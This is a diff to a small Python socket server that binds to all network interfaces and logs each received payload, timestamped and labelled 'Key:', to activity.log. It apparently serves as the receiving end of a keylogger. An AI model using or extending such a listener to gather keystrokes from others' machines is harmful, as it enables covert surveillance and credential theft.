@@ -5,11 +5,10 @@ import socket
 listeningPort = 8080
 
 class Server:
-    def __init__(self, host, port):
-        self._host = host
+    def __init__(self, port):
         self._port = port
         self._socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        self._socket.bind(('localhost', self._port))
+        self._socket.bind(('', self._port))
 
     @property
     def port(self):
@@ -19,13 +18,6 @@ class Server:
     def port(self, new_port):
         self._port = new_port
     
-    @property
-    def host(self):
-        return self.host
-
-    @port.setter
-    def host(self, new_host):
-        self._host = new_host
 
     @property
     def socket(self):
@@ -35,7 +27,7 @@ class Server:
     def connect(self):
         self.socket.listen()
         print(f"\nServer listening on {self.port}")
-        logging.debug("\nServer successfully initialized!")
+        logging.debug("Server successfully initialized!")
         print("\nServer trying to establish connection")
         while True:
             connection, adress = self.socket.accept()
@@ -47,17 +39,16 @@ class Server:
                     if not data:
                         break
                     print(f'Received data: {data}')
-                    logging.debug(data)
-                    connection.send(bytes("Data received", 'utf-8'))
+                    logging.debug(f"Key: {data}")
             except (ConnectionResetError):
                 print("Client has disconnected")
 
 
  
 def Start():
-    server = Server('localhost', listeningPort)
+    server = Server(listeningPort)
     server.connect()
 
 if __name__ == "__main__":
-    logging.basicConfig(level=logging.DEBUG, filename='activity.log', format='Time: %(asctime)s | Key: %(message)s')
+    logging.basicConfig(level=logging.DEBUG, filename='activity.log', format='Time: %(asctime)s | %(message)s')
     Start()
